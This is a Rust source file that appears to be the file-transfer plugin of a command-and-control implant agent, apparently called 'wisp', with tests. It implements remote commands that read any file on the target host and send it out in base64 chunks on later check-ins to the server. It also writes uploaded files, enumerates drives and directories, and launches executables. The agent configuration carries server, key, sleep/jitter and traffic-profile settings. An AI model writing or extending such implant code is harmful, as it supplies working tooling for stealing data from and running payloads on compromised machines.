// fs plugin — file transfer commands (matches Go agent/commands/fs.go):
//   CMD_UPLOAD(5)   write one upload chunk to the target
//   CMD_DOWNLOAD(6) read a file and report it in chunks (status "downloading")
//   CMD_LSJSON(12)  structured directory listing for the File Explorer
//   CMD_EXECFILE(16) launch an executable without waiting
//
// Wire formats are shared/protocol-locked with the Go agent + server
// (handleDownloadChunk aggregates chunks in the server).

use crate::protocol::types::Task;
use crate::registry::{AgentCtx, Registry, TaskResult};
use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine;
use serde::Serialize;
use std::path::Path;

/// Raw byte size of one download chunk (base64 expands it to ~683KB).
const DOWNLOAD_CHUNK_SIZE: usize = 512 * 1024;

pub fn register(r: &mut Registry) -> Result<(), String> {
    r.register(crate::protocol::constants::CMD_UPLOAD, exec_upload)?;
    r.register(crate::protocol::constants::CMD_DOWNLOAD, exec_download)?;
    r.register(crate::protocol::constants::CMD_LSJSON, exec_lsjson)?;
    r.register(crate::protocol::constants::CMD_EXECFILE, exec_execfile)?;
    Ok(())
}

#[derive(Serialize)]
struct DownloadBlock {
    index: usize,
    total: usize,
    filename: String,
    data: String, // base64 raw bytes
}

#[derive(Serialize)]
struct FsEntry {
    name: String,
    is_dir: bool,
    size: i64,
    #[serde(rename = "mod")]
    mod_: String,
}

/// Reject ".." path traversal segments (mirrors Go hasPathTraversal).
fn has_path_traversal(p: &str) -> bool {
    p.split(['/', '\\']).any(|part| part == "..")
}

fn exec_upload(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let v: serde_json::Value =
        serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
    let path = v["path"].as_str().unwrap_or("").to_string();
    let index = v["index"].as_u64().unwrap_or(0) as usize;
    let total = v["total"].as_u64().unwrap_or(1) as usize;
    let data = v["data"].as_str().unwrap_or("").to_string();

    if path.is_empty() {
        return Some(TaskResult::fail(&task.id, "error: no path specified".into()));
    }
    if data.is_empty() {
        return Some(TaskResult::fail(&task.id, "error: no data specified".into()));
    }
    if has_path_traversal(&path) {
        return Some(TaskResult::fail(&task.id, "error: path traversal is not allowed".into()));
    }
    let bytes = match B64.decode(&data) {
        Ok(b) => b,
        Err(e) => return Some(TaskResult::fail(&task.id, format!("error: decode data: {e}"))),
    };

    if let Some(dir) = Path::new(&path).parent() {
        if !dir.as_os_str().is_empty() {
            if let Err(e) = std::fs::create_dir_all(dir) {
                return Some(TaskResult::fail(&task.id, format!("error: mkdir: {e}")));
            }
        }
    }

    let open_res = std::fs::OpenOptions::new()
        .create(true)
        .write(true)
        .append(index != 0)
        .truncate(index == 0)
        .open(&path);
    let mut f = match open_res {
        Ok(f) => f,
        Err(e) => return Some(TaskResult::fail(&task.id, format!("error: open: {e}"))),
    };
    if let Err(e) = std::io::Write::write_all(&mut f, &bytes) {
        return Some(TaskResult::fail(&task.id, format!("error: write: {e}")));
    }

    if index + 1 >= total {
        Some(TaskResult::ok(&task.id, format!("upload complete: {path}")))
    } else {
        Some(TaskResult::ok(&task.id, format!("chunk {}/{} written: {path}", index + 1, total)))
    }
}

fn exec_download(ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let v: serde_json::Value =
        serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
    let path_arg = v["path"]
        .as_str()
        .or_else(|| v["file"].as_str())
        .unwrap_or("")
        .to_string();
    if path_arg.is_empty() {
        return Some(TaskResult::fail(&task.id, "error: no file specified".into()));
    }
    let path = if Path::new(&path_arg).is_absolute() {
        path_arg
    } else {
        ctx.cwd.join(&path_arg).to_string_lossy().into_owned()
    };
    if has_path_traversal(&path) {
        return Some(TaskResult::fail(&task.id, "error: path traversal is not allowed".into()));
    }

    let data = match std::fs::read(&path) {
        Ok(d) => d,
        Err(e) => return Some(TaskResult::fail(&task.id, format!("error: {e}"))),
    };

    let filename = Path::new(&path)
        .file_name()
        .map(|f| f.to_string_lossy().into_owned())
        .unwrap_or_default();
    let total = data.len().div_ceil(DOWNLOAD_CHUNK_SIZE).max(1);

    // First chunk returned now; the rest queued for the following checkins.
    let mut first: Option<DownloadBlock> = None;
    let mut queue = Vec::new();
    for i in 0..total {
        let start = i * DOWNLOAD_CHUNK_SIZE;
        let end = (start + DOWNLOAD_CHUNK_SIZE).min(data.len());
        let blk = DownloadBlock {
            index: i,
            total,
            filename: filename.clone(),
            data: B64.encode(&data[start..end]),
        };
        if i == 0 {
            first = Some(blk);
        } else {
            queue.push(blk);
        }
    }

    for blk in queue {
        let j = serde_json::to_string(&blk).unwrap_or_default();
        ctx.queue_result(TaskResult {
            task_id: task.id.clone(),
            output: j,
            status: "downloading".into(),
        });
    }

    let first = first.expect("at least one chunk");
    let j = serde_json::to_string(&first).unwrap_or_default();
    Some(TaskResult {
        task_id: task.id.clone(),
        output: j,
        status: "downloading".into(),
    })
}

fn exec_lsjson(ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let v: serde_json::Value =
        serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
    let path_arg = v["path"].as_str().unwrap_or("").to_string();
    const ROOTS_MARKER: &str = "__roots__";

    let (abs_path, entries) = if path_arg == ROOTS_MARKER {
        #[cfg(target_os = "windows")]
        {
            let mut items = Vec::new();
            for d in b'A'..=b'Z' {
                let root = format!("{}:\\", d as char);
                if Path::new(&root).exists() {
                    items.push(FsEntry {
                        name: root,
                        is_dir: true,
                        size: 0,
                        mod_: String::new(),
                    });
                }
            }
            (ROOTS_MARKER.to_string(), items)
        }
        #[cfg(not(target_os = "windows"))]
        {
            let items = vec![FsEntry {
                name: "/".into(),
                is_dir: true,
                size: 0,
                mod_: String::new(),
            }];
            (ROOTS_MARKER.to_string(), items)
        }
    } else {
        let dir = if path_arg.is_empty() {
            ctx.cwd.clone()
        } else if Path::new(&path_arg).is_absolute() {
            std::path::PathBuf::from(&path_arg)
        } else {
            ctx.cwd.join(&path_arg)
        };
        let mut items = Vec::new();
        if let Ok(rd) = std::fs::read_dir(&dir) {
            for e in rd.flatten() {
                let md = e.metadata().ok();
                items.push(FsEntry {
                    name: e.file_name().to_string_lossy().into_owned(),
                    is_dir: e.file_type().map(|t| t.is_dir()).unwrap_or(false),
                    size: md.as_ref().map(|m| m.len() as i64).unwrap_or(0),
                    mod_: md
                        .and_then(|m| m.modified().ok())
                        .map(|t| t.duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0).to_string())
                        .unwrap_or_default(),
                });
            }
        }
        (dir.to_string_lossy().into_owned(), items)
    };

    let out = serde_json::json!({
        "cwd": ctx.cwd.to_string_lossy(),
        "path": abs_path,
        "entries": entries,
    })
    .to_string();
    Some(TaskResult::ok(&task.id, out))
}

fn exec_execfile(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let v: serde_json::Value =
        serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
    let path = v["path"].as_str().unwrap_or("").to_string();
    if path.is_empty() {
        return Some(TaskResult::fail(&task.id, "error: no file specified".into()));
    }
    #[cfg(target_os = "windows")]
    {
        let start = std::process::Command::new(&path).spawn();
        match start {
            Ok(mut child) => {
                let pid = child.id();
                // Reap in background so the child is not left a zombie.
                std::thread::spawn(move || {
                    let _ = child.wait();
                });
                Some(TaskResult::ok(&task.id, format!("started: {path} (pid {pid})")))
            }
            Err(e) => Some(TaskResult::fail(&task.id, format!("error: {e}"))),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        match std::process::Command::new(&path).spawn() {
            Ok(mut child) => {
                let pid = child.id();
                // Reap in background so the child is not left a zombie.
                std::thread::spawn(move || {
                    let _ = child.wait();
                });
                Some(TaskResult::ok(&task.id, format!("started: {path} (pid {pid})")))
            }
            Err(e) => Some(TaskResult::fail(&task.id, format!("error: {e}"))),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn task(args: &str) -> Task {
        Task { id: "t".into(), command_id: 0, args: args.into(), status: "pending".into(), result: String::new() }
    }

    fn ctx() -> AgentCtx {
        AgentCtx::new(crate::agent::AgentConfig {
            server_host: "h".into(), server_port: 1, rsa_pub_pem: "p".into(),
            psk: "p".into(), sleep_ms: 1, jitter: 0, transport: "http".into(), scheme: "http".into(),
            traffic_profile: None,
        })
    }

    #[test]
    fn traversal_rejected() {
        assert!(has_path_traversal("../../etc/passwd"));
        assert!(has_path_traversal("a\\..\\b"));
        assert!(!has_path_traversal("/etc/passwd"));
    }

    #[test]
    fn upload_chunks_write_file() {
        let dir = std::env::temp_dir().join("wisp-fs-up");
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("f.bin").to_string_lossy().into_owned();

        let data1 = B64.encode(b"hello ");
        let t1 = task(&format!(r#"{{"path":"{path}","index":0,"total":2,"data":"{data1}"}}"#));
        let r = exec_upload(&mut ctx(), &t1).unwrap();
        assert!(r.output.contains("chunk 1/2"));

        let data2 = B64.encode(b"world");
        let t2 = task(&format!(r#"{{"path":"{path}","index":1,"total":2,"data":"{data2}"}}"#));
        let r = exec_upload(&mut ctx(), &t2).unwrap();
        assert!(r.output.contains("upload complete"));

        let written = std::fs::read(&path).unwrap();
        assert_eq!(written, b"hello world");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn download_queues_chunks() {
        let dir = std::env::temp_dir().join("wisp-fs-dl");
        let _ = std::fs::create_dir_all(&dir);
        let path = dir.join("big.bin").to_string_lossy().into_owned();
        let big = vec![0xAB; DOWNLOAD_CHUNK_SIZE * 2 + 10];
        std::fs::write(&path, &big).unwrap();

        let mut c = ctx();
        let t = task(&format!(r#"{{"path":"{path}"}}"#));
        let r = exec_download(&mut c, &t).unwrap();
        assert_eq!(r.status, "downloading");
        let first: serde_json::Value = serde_json::from_str(&r.output).unwrap();
        assert_eq!(first["index"], 0);
        assert_eq!(first["total"], 3);
        // 2 queued chunks in ctx.pending
        assert_eq!(c.pending.len(), 2);
        assert_eq!(c.pending[0].status, "downloading");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn lsjson_returns_entries() {
        let dir = std::env::temp_dir().join("wisp-fs-ls");
        let _ = std::fs::create_dir_all(&dir);
        std::fs::write(dir.join("a.txt"), b"x").unwrap();

        let mut c = ctx();
        let t = task(&format!(r#"{{"path":"{}"}}"#, dir.to_string_lossy()));
        let r = exec_lsjson(&mut c, &t).unwrap();
        let v: serde_json::Value = serde_json::from_str(&r.output).unwrap();
        assert!(v["entries"].as_array().unwrap().iter().any(|e| e["name"] == "a.txt"));

        let _ = std::fs::remove_dir_all(&dir);
    }
}
